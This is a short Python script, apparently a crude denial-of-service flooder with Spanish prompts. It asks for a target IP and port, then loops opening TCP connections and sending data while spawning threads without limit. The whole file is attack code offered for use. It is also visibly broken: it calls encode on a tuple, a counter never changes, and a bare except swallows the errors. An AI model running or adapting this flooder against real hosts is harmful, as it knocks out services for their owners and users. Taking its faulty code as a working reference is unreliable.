import socket
import threading

i = 0

def main():
    ipTarget = input("Escribe la ip: ")
    port = input("Escribe el puerto: ")
    print(ipTarget)
    print(port)
    ddos(ipTarget, port)
    while i < 10:
        t = threading.Thread(target=ddos, args=(ipTarget, port))
        t.start()

def ddos(ipTarget, port):
    try:
        port = int(port)
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ipTarget,port))
            s.sendto((ipTarget, 'hi').encode('ascii'), (ipTarget, port))
            #s.sendto(().encode(''ascii),(target,port))
            s.close()
    except:
        print('stopeado')
main()